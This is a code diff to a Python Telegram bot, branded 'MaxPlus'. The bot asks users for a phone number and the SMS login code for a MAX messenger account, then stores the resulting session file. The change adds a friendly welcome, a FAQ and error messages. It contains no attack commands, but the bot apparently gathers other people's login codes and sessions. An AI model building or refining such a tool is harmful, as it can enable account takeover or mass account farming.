@@ -23,8 +23,17 @@ class TelegramSmsProvider:
 @dp.message(Command("start"))
 async def start_cmd(msg: Message):
     await msg.answer(
-        "Привет! Отправь номер в формате +79161234567\n"
-        "Я запрошу SMS и авторизую аккаунт."
+        "👋 Добро пожаловать в <b>MaxPlus</b> — сервис авторизации аккаунтов MAX!\n\n"
+        "📱 <b>Как пользоваться:</b>\n"
+        "1. Отправь номер в формате +79161234567\n"
+        "2. Дождись SMS с кодом\n"
+        "3. Отправь код командой /code 12345\n\n"
+        "❓ <b>FAQ:</b>\n"
+        "• Номер не зарегистрирован? — Аккаунт будет создан автоматически\n"
+        "• Не приходит SMS? — Убедись, что номер не виртуальный\n"
+        "• Ошибка авторизации? — Проверь код или попробуй позже\n\n"
+        "Просто отправь номер и начнём!",
+        parse_mode="HTML"
     )
 
 @dp.message(F.text, ~F.text.startswith("/"))
@@ -43,7 +52,13 @@ async def phone_handler(msg: Message):
     )
 
     asyncio.create_task(run_client(msg, client, phone, sms_provider))
-    await msg.answer(f"⏳ Запрашиваю SMS на {phone}... Жду код.")
+
+    await msg.answer(
+        f"📤 SMS-код отправлен на номер {phone}. Ожидайте сообщение в течение минуты."
+    )
+    await msg.answer(
+        "📩 Отправьте полученный код командой /code. Например: /code 12345"
+    )
 
 async def run_client(msg: Message, client: Client, phone: str, sms_provider: TelegramSmsProvider):
     try:
@@ -51,7 +66,17 @@ async def run_client(msg: Message, client: Client, phone: str, sms_provider: Tel
         await client.start()
         await msg.answer(f"✅ {phone} авторизован!\nСессия: cache/{phone}.db")
     except Exception as e:
-        await msg.answer(f"❌ Ошибка: {type(e).__name__}: {e}")
+        error_text = str(e).lower()
+        error_name = type(e).__name__.lower()
+
+        if "auth" in error_name or "code" in error_text or "token" in error_text:
+            await msg.answer("❌ Неверный код или номер заблокирован")
+        elif "connect" in error_name or "network" in error_text or "timeout" in error_text:
+            await msg.answer("❌ Проблемы с сетью. Попробуй позже")
+        elif "already" in error_text or "session" in error_text:
+            await msg.answer("ℹ️ Этот номер уже авторизован")
+        else:
+            await msg.answer(f"❌ Ошибка: {e}")
     finally:
         pending.pop(msg.from_user.id, None)
 
